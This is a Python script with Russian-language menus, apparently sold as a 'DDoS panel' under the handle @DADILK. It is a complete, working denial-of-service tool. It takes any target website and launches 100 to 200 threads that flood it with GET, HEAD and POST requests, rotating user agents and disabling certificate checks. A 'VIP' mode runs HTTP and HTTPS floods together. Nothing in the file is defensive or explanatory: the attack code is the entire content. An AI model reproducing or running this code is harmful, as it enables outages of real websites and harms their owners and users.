#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ===============================================================
# ██████╗ ██████╗  ██████╗ ███████╗
# ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
# ██║  ██║██║  ██║██║   ██║███████╗
# ██║  ██║██║  ██║██║   ██║╚════██║
# ██████╔╝██████╔╝╚██████╔╝███████║
# ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
# ===============================================================
#                    ДУДОС МОЯ ПАНЕЛЬ
# ===============================================================
#                    BY @DADILK PREMIUM
# ===============================================================

import os
import sys
import time
import random
import socket
import threading
import datetime
import platform
import subprocess
import ssl
import urllib3
from urllib.parse import urlparse

# Цвета
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

# ===============================================================
# ГЛАВНАЯ НАДПИСЬ ДУДОС
# ===============================================================

DUDOS_ASCII = f"""
{RED}██████╗ ██╗   ██╗██████╗  ██████╗ ███████╗{RESET}
{RED}██╔══██╗██║   ██║██╔══██╗██╔═══██╗██╔════╝{RESET}
{RED}██║  ██║██║   ██║██║  ██║██║   ██║███████╗{RESET}
{RED}██║  ██║██║   ██║██║  ██║██║   ██║╚════██║{RESET}
{RED}██████╔╝╚██████╔╝██████╔╝╚██████╔╝███████║{RESET}
{RED}╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{RESET}

{RED}███╗   ███╗ ██████╗ ██╗   ██╗{RESET}
{RED}████╗ ████║██╔═══██╗╚██╗ ██╔╝{RESET}
{RED}██╔████╔██║██║   ██║ ╚████╔╝ {RESET}
{RED}██║╚██╔╝██║██║   ██║  ╚██╔╝  {RESET}
{RED}██║ ╚═╝ ██║╚██████╔╝   ██║   {RESET}
{RED}╚═╝     ╚═╝ ╚═════╝    ╚═╝   {RESET}
"""

# ===============================================================
# ОСНОВНОЙ КЛАСС
# ===============================================================

class DudosHttps:
    def __init__(self):
        self.running = True
        self.stop_attack = False
        self.packets_sent = 0
        self.requests_sent = 0
        self.start_time = None
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def get_domain_from_url(self, url):
        """Извлекает домен из URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        parsed = urlparse(url)
        return parsed.netloc, parsed.scheme
    
    def print_menu(self):
        """Печать меню"""
        print(f"\n{RED}{'='*60}{RESET}")
        print(f"{RED}█{RESET} 1. {GREEN}DDOS АТАКА НА HTTPS САЙТ{RESET}            {RED}█{RESET}")
        print(f"{RED}█{RESET} 2. {GREEN}DDOS АТАКА НА HTTP САЙТ{RESET}             {RED}█{RESET}")
        print(f"{RED}█{RESET} 3. {GREEN}VIP РЕЖИМ (МАКСИМАЛЬНАЯ МОЩЬ){RESET}        {RED}█{RESET}")
        print(f"{RED}█{RESET} 0. {RED}ВЫХОД{RESET}                                  {RED}█{RESET}")
        print(f"{RED}{'='*60}{RESET}")
    
    def https_flood(self, domain, duration):
        """HTTPS флуд"""
        end_time = time.time() + duration
        paths = ["/", "/index.html", "/home", "/api", "/wp-admin", "/admin", "/login", "/about", "/contact"]
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]
        
        # Создаем пул соединений
        pool = urllib3.PoolManager(
            num_pools=100,
            maxsize=100,
            cert_reqs='CERT_NONE',
            assert_hostname=False
        )
        
        while time.time() < end_time and not self.stop_attack:
            try:
                path = random.choice(paths)
                url = f"https://{domain}{path}"
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': '*/*',
                    'Accept-Language': 'ru-RU,ru;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                }
                
                # Отправляем GET запрос
                response = pool.request('GET', url, headers=headers, timeout=1.0, retries=False)
                self.requests_sent += 1
                self.packets_sent += 1
                
                # Отправляем HEAD запрос
                response = pool.request('HEAD', url, headers=headers, timeout=1.0, retries=False)
                self.requests_sent += 1
                self.packets_sent += 1
                
                # Отправляем POST запрос
                data = {'a': random.randint(1, 999999)}
                response = pool.request('POST', url, headers=headers, fields=data, timeout=1.0, retries=False)
                self.requests_sent += 1
                self.packets_sent += 1
                
            except:
                pass
    
    def http_flood(self, domain, duration):
        """HTTP флуд"""
        end_time = time.time() + duration
        paths = ["/", "/index.html", "/home", "/api", "/wp-admin", "/admin", "/login", "/about", "/contact"]
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)"
        ]
        
        pool = urllib3.PoolManager(num_pools=100, maxsize=100)
        
        while time.time() < end_time and not self.stop_attack:
            try:
                path = random.choice(paths)
                url = f"http://{domain}{path}"
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': '*/*',
                    'Accept-Language': 'ru-RU,ru;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                }
                
                # Множественные запросы для большей нагрузки
                response = pool.request('GET', url, headers=headers, timeout=1.0, retries=False)
                self.requests_sent += 1
                self.packets_sent += 1
                
                response = pool.request('HEAD', url, headers=headers, timeout=1.0, retries=False)
                self.requests_sent += 1
                self.packets_sent += 1
                
                data = {'a': random.randint(1, 999999)}
                response = pool.request('POST', url, headers=headers, fields=data, timeout=1.0, retries=False)
                self.requests_sent += 1
                self.packets_sent += 1
                
            except:
                pass
    
    def vip_attack(self, domain, duration):
        """VIP атака - HTTPS и HTTP одновременно"""
        end_time = time.time() + duration
        
        # Создаем потоки для HTTPS и HTTP атак
        https_threads = []
        http_threads = []
        
        # 50 потоков HTTPS
        for i in range(50):
            t = threading.Thread(target=self.https_flood, args=(domain, duration))
            t.daemon = True
            https_threads.append(t)
            t.start()
        
        # 50 потоков HTTP
        for i in range(50):
            t = threading.Thread(target=self.http_flood, args=(domain, duration))
            t.daemon = True
            http_threads.append(t)
            t.start()
        
        # Мониторинг
        while time.time() < end_time and not self.stop_attack:
            elapsed = int(time.time() - self.start_time)
            remaining = int(end_time - time.time())
            if remaining < 0:
                remaining = 0
            rps = self.requests_sent / elapsed if elapsed > 0 else 0
            
            print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ОСТАЛОСЬ: {remaining:4d}с | ЗАПРОСОВ: {self.requests_sent:8d} | RPS: {rps:.0f}{RESET}", end="")
            time.sleep(1)
        print()
    
    def run_attack(self, url, attack_type):
        """Запуск атаки"""
        self.clear_screen()
        print(DUDOS_ASCII)
        
        print(f"\n{RED}{'='*60}{RESET}")
        print(f"{RED}█{RESET} {'ИНФОРМАЦИЯ ОБ АТАКЕ':^58} {RED}█{RESET}")
        print(f"{RED}{'='*60}{RESET}")
        
        # Получаем домен
        domain, scheme = self.get_domain_from_url(url)
        print(f"{RED}▶ САЙТ: {WHITE}{url}{RESET}")
        print(f"{RED}▶ ДОМЕН: {WHITE}{domain}{RESET}")
        print(f"{RED}▶ ПРОТОКОЛ: {WHITE}{scheme}{RESET}")
        
        # Вводим длительность
        try:
            duration = int(input(f"{RED}▶ ДЛИТЕЛЬНОСТЬ АТАКИ (СЕКУНД): {WHITE}"))
        except:
            duration = 60
            print(f"{RED}▶ ИСПОЛЬЗУЕТСЯ: {WHITE}60 СЕКУНД{RESET}")
        
        print(f"\n{RED}{'='*60}{RESET}")
        
        if attack_type == 1:
            print(f"{RED}█{RESET} {'ЗАПУСК HTTPS АТАКИ':^58} {RED}█{RESET}")
            attack_func = self.https_flood
            threads_count = 100
        elif attack_type == 2:
            print(f"{RED}█{RESET} {'ЗАПУСК HTTP АТАКИ':^58} {RED}█{RESET}")
            attack_func = self.http_flood
            threads_count = 100
        else:
            print(f"{RED}█{RESET} {'ЗАПУСК VIP РЕЖИМА (200 ПОТОКОВ)':^58} {RED}█{RESET}")
            attack_func = self.vip_attack
            threads_count = 200
        
        print(f"{RED}{'='*60}{RESET}")
        print(f"{RED}▶ ДЛЯ ОСТАНОВКИ НАЖМИТЕ CTRL+C{RESET}\n")
        
        self.stop_attack = False
        self.requests_sent = 0
        self.packets_sent = 0
        self.start_time = time.time()
        
        if attack_type == 3:
            # VIP режим запускается по-особому
            attack_thread = threading.Thread(target=self.vip_attack, args=(domain, duration))
            attack_thread.daemon = True
            attack_thread.start()
        else:
            # Запускаем множество потоков
            for i in range(threads_count):
                t = threading.Thread(target=attack_func, args=(domain, duration))
                t.daemon = True
                t.start()
        
        # Мониторинг
        try:
            end_time = time.time() + duration
            while time.time() < end_time:
                elapsed = int(time.time() - self.start_time)
                remaining = int(end_time - time.time())
                if remaining < 0:
                    remaining = 0
                rps = self.requests_sent / elapsed if elapsed > 0 else 0
                
                print(f"\r{RED}▶ ВРЕМЯ: {elapsed:4d}с | ОСТАЛОСЬ: {remaining:4d}с | ЗАПРОСОВ: {self.requests_sent:8d} | RPS: {rps:.0f}{RESET}", end="")
                time.sleep(1)
            
            print(f"\n\n{RED}✅ АТАКА ЗАВЕРШЕНА! ВСЕГО ЗАПРОСОВ: {self.requests_sent}{RESET}")
            
        except KeyboardInterrupt:
            self.stop_attack = True
            print(f"\n\n{RED}⛔ АТАКА ОСТАНОВЛЕНА! ВСЕГО ЗАПРОСОВ: {self.requests_sent}{RESET}")
        
        input(f"\n{RED}▶ НАЖМИТЕ ENTER ДЛЯ ПРОДОЛЖЕНИЯ...{RESET}")
    
    def run(self):
        """Запуск программы"""
        while self.running:
            self.clear_screen()
            print(DUDOS_ASCII)
            print(f"{RED}{'='*60}{RESET}")
            print(f"{RED}█{RESET} {'ПАНЕЛЬ УПРАВЛЕНИЯ':^58} {RED}█{RESET}")
            print(f"{RED}█{RESET} {'BY @DADILK PREMIUM':^58} {RED}█{RESET}")
            print(f"{RED}{'='*60}{RESET}")
            
            self.print_menu()
            
            choice = input(f"{RED}▶ ВЫБОР: {WHITE}").strip()
            
            if choice == '0':
                self.running = False
                break
            
            elif choice == '1':
                # HTTPS атака
                url = input(f"{RED}▶ ВВЕДИТЕ САЙТ (ПРИМЕР: https://example.com): {WHITE}").strip()
                self.run_attack(url, 1)
            
            elif choice == '2':
                # HTTP атака
                url = input(f"{RED}▶ ВВЕДИТЕ САЙТ (ПРИМЕР: http://example.com): {WHITE}").strip()
                self.run_attack(url, 2)
            
            elif choice == '3':
                # VIP режим
                url = input(f"{RED}▶ ВВЕДИТЕ САЙТ: {WHITE}").strip()
                self.run_attack(url, 3)
        
        # Выход
        self.clear_screen()
        print(f"""
{RED}════════════════════════════════════════════════════════════{RESET}
{RED}█                                                          █{RESET}
{RED}█         ДУДОС МОЯ ПАНЕЛЬ ЗАВЕРШАЕТ РАБОТУ               █{RESET}
{RED}█                                                          █{RESET}
{RED}█         СПАСИБО ЗА ИСПОЛЬЗОВАНИЕ                        █{RESET}
{RED}█         BY @DADILK PREMIUM                              █{RESET}
{RED}█                                                          █{RESET}
{RED}════════════════════════════════════════════════════════════{RESET}
{RED}обход by DADILK{RESET}
{RED}Спасибо за покупку{RESET}
        """)
        time.sleep(2)

# ===============================================================
# ЗАПУСК
# ===============================================================

if __name__ == "__main__":
    try:
        # Отключаем warnings для urllib3
        urllib3.disable_warnings()
        
        dudos = DudosHttps()
        dudos.run()
    except KeyboardInterrupt:
        print(f"\n{RED}⛔ ВЫХОД ПО CTRL+C{RESET}")
        print(f"{RED}обход by DADILK{RESET}")
        print(f"{RED}Спасибо за покупку{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}❌ ОШИБКА: {e}{RESET}")
        print(f"{RED}обход by DADILK{RESET}")
        print(f"{RED}Спасибо за покупку{RESET}")
        sys.exit(1)
